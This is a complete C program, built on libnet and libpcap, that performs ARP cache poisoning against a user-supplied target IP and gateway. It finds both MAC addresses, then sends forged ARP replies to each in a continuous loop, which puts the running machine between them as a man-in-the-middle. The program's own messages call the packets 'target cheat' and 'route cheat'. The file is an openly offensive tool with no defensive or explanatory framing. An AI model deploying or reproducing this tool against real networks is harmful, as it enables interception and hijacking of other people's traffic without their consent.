#include <libnet.h>
#include <pcap.h>
#include <stdio.h>
#include <pthread.h>
#pragma pack (1)


char arg1[100];
char arg2[100];
char dev[10];
int flag=0;
u_int32_t gate_ip;
u_int32_t dst_ip;
u_int32_t my_ip;	
unsigned char dst_mac[6]={0xff,0xff,0xff,0xff,0xff,0xff};
unsigned char my_mac[6]={0xff,0xff,0xff,0xff,0xff,0xff};
unsigned char gate_mac[6]={0xff,0xff,0xff,0xff,0xff,0xff};
struct my_ethhdr
{
	unsigned char mye_dst[6];
	unsigned char mye_src[6];
	u_int16_t mye_pto;
};
struct my_arp
{
	unsigned short mya_hw;
	unsigned short mya_pro;
	unsigned char mya_hln;
	unsigned char mya_pln;
	unsigned short mya_op;
	unsigned char mya_sha[6];
	u_int32_t mya_spa;
	unsigned char mya_dha[6];
	u_int32_t mya_dpa;
//	unsigned char mya_pad[18];
};

int arp_send()
{
	libnet_t *app1,*app2;
	char buf[100];

	app1=libnet_init(LIBNET_LINK_ADV,dev,buf);
	app2=libnet_init(LIBNET_LINK_ADV,dev,buf);

	libnet_build_arp(ARPHRD_ETHER,ETHERTYPE_IP,6,4,ARPOP_REPLY,(u_int8_t *)my_mac,(u_int8_t *)&gate_ip,(u_int8_t *)dst_mac,(u_int8_t *)&dst_ip,NULL,0,app1,0);
	libnet_build_ethernet(dst_mac,gate_mac,0x0806,NULL,0,app1,0);
	
	libnet_build_arp(ARPHRD_ETHER,ETHERTYPE_IP,6,4,ARPOP_REPLY,(u_int8_t *)my_mac,(u_int8_t *)&dst_ip,(u_int8_t *)gate_mac,(u_int8_t *)&gate_ip,NULL,0,app2,0);
	libnet_build_ethernet(gate_mac,dst_mac,0x0806,NULL,0,app2,0);
	
	libnet_write(app1);
	printf("1 target cheat sent\n");
	libnet_write(app2);
	printf("2 route cheat sent\n");

	return 0;
}

void arp_presend(u_char *user,const struct pcap_pkthdr *h,const u_char *p)
{
	struct my_ethhdr *ethptr;
 	unsigned char *mac;
	u_int16_t po;
	struct my_arp *arpptr;
 
	ethptr=(struct my_ethhdr *)p;
	po=ethptr->mye_pto;
	arpptr=(struct my_arp*)(p+14);
//	printf("arp_presend\n");
	if(ntohs(arpptr->mya_op)==2)
	{
		if(ntohl(arpptr->mya_spa)==htonl(dst_ip))
		{
			mac=ethptr->mye_src;
			memcpy(dst_mac,mac,6);
			printf("dst mac=%02x:%02x:%02x:%02x:%02x:%02x\n",dst_mac[0],dst_mac[1],dst_mac[2],dst_mac[3],dst_mac[4],dst_mac[5]);
			//printf("proto=0x%04x\n",ntohs(po));
			//printf("arp option=%d\n",ntohs(arpptr->mya_op));
		}
		if(ntohl(arpptr->mya_spa)==htonl(gate_ip))
		{
			mac=ethptr->mye_src;
			memcpy(gate_mac,mac,6);
			printf("gate mac=%02x:%02x:%02x:%02x:%02x:%02x\n",gate_mac[0],gate_mac[1],gate_mac[2],gate_mac[3],gate_mac[4],gate_mac[5]);
			//printf("proto=0x%04x\n",ntohs(po));
			//printf("arp option=%d\n",ntohs(arpptr->mya_op));
		}
	}
	if((ntohs(arpptr->mya_op)==1)&&(flag==1))
	{
		arp_send();
	}
}

void arp_request(void);

int arp_rev_req(char *arg)
{
	pcap_t *app1,*app2;
	char buf[100];
	struct bpf_program fp;
	bpf_u_int32 mask;
	bpf_u_int32 net;
	int ret;

	pcap_lookupnet(dev,&net,&mask,buf);
	app1=pcap_open_live(dev,65535,1,1000,buf);
	pcap_compile(app1,&fp,arg,1,mask);
	pcap_setfilter(app1,&fp);
	ret=pcap_dispatch(app1,1,arp_presend,NULL);

	if(ret<=0)
	{
		do
		{
			arp_request();
			ret=pcap_dispatch(app1,1,arp_presend,NULL);
		}
		while(ret<=0);
	}
	pcap_close(app1);

	return 1;
}

int arp_rev_cheat(char *arg)
{
	pcap_t *app1,*app2;
	char buf[100];
	struct bpf_program fp;
	bpf_u_int32 mask;
	bpf_u_int32 net;
	
	pcap_lookupnet(dev,&net,&mask,buf);
	app1=pcap_open_live(dev,65535,1,1000,buf);
	pcap_compile(app1,&fp,arg,1,mask);
	pcap_setfilter(app1,&fp);
	pcap_loop(app1,1,arp_presend,NULL);

	
	pcap_close(app1);

	return 1;
}


void arp_request()
{	
	libnet_t *app;
	char buf[100];

	app=libnet_init(LIBNET_LINK_ADV,dev,buf);
	if(app==NULL)
	{
		printf("libnet_init failed\n");
		exit(1);
	}

	libnet_build_arp(ARPHRD_ETHER,ETHERTYPE_IP,6,4,ARPOP_REQUEST,(u_int8_t *)my_mac,(u_int8_t *)&my_ip,(u_int8_t *)dst_mac,(u_int8_t *)&dst_ip,NULL,0,app,0);
	libnet_build_ethernet(dst_mac,my_mac,0x0806,NULL,0,app,0);
	libnet_write(app);
	//printf("dst arp request sent\n");
	//sleep(2);
	libnet_build_arp(ARPHRD_ETHER,ETHERTYPE_IP,6,4,ARPOP_REQUEST,(u_int8_t *)my_mac,(u_int8_t *)&my_ip,(u_int8_t *)gate_mac,(u_int8_t *)&gate_ip,NULL,0,app,0);
	libnet_build_ethernet(gate_mac,my_mac,0x0806,NULL,0,app,0);
	libnet_write(app);
	//printf("gate arp request sent\n");
	
}


int detect()
{
	libnet_t *app;
	char buf[100];
	unsigned char mip[4];
	unsigned char dip[4];
	unsigned char gip[4];
	struct libnet_ether_addr *mmac;
	pthread_t tid1,tid2;
	
	app=libnet_init(LIBNET_LINK_ADV,dev,buf);
	if(app==NULL)
	{
		printf("libnet_init failed\n");
		exit(1);
	}

	memcpy(dip,(unsigned char *)&dst_ip,4);
	memcpy(gip,(unsigned char *)&gate_ip,4);
	my_ip=libnet_get_ipaddr4(app);
	mmac=libnet_get_hwaddr(app);
	memcpy(mip,(char *)&my_ip,4);
	memcpy(my_mac,mmac,6);
	printf("my ip=%d.%d.%d.%d\nmy mac=%02x:%02x:%02x:%02x:%02x:%02x\n",mip[0],mip[1],mip[2],mip[3],my_mac[0],my_mac[1],my_mac[2],my_mac[3],my_mac[4],my_mac[5]);
	
	sprintf(arg1,"arp dst host %d.%d.%d.%d and src host %d.%d.%d.%d",mip[0],mip[1],mip[2],mip[3],dip[0],dip[1],dip[2],dip[3]);
	sprintf(arg2,"arp dst host %d.%d.%d.%d and src host %d.%d.%d.%d",mip[0],mip[1],mip[2],mip[3],gip[0],gip[1],gip[2],gip[3]);

//	printf("arg1=%s\n",arg1);
//	printf("arg2=%s\n",arg2);
	if(pthread_create(&tid1,NULL,(void *(*)(void *))arp_rev_req,arg1))
	{
		printf("thread creat failed\n");
		exit(1);
	}
	if(pthread_create(&tid2,NULL,(void * (*)(void *))arp_rev_req,arg2))
	{
		printf("thread creat failed\n");
		exit(1);
	}

	arp_request();

	pthread_join(tid1,NULL);
	pthread_join(tid2,NULL);
	return 0;
}

int main()
{
	char temp[50];
	

	memset(temp,0,50);
	memset(arg1,0,50);
	memset(arg2,0,50);
	printf("input your device:\n");
	scanf("%s",dev);
	printf("input the gateway ip:\n");
	scanf("%s",temp);
	gate_ip=inet_addr(temp);
//	printf("htonl(gate_ip) %d\n",gate_ip);
	printf("input the target ip\n");
	scanf("%s",temp);
	dst_ip=inet_addr(temp);
//	printf("htonl(dst_ip) %d\n",htonl(dst_ip));
	
	printf("============detect start=============\n");
	if(detect())
	{
		printf("detect failed\n");
		exit(1);
	}
	printf("============detect finnish===========\n");
	flag=1;

	printf("============arp cheat start==========\n");
	arp_send();
	while(1)
	{
		arp_rev_cheat("arp");
	}

			

	return 0;
}
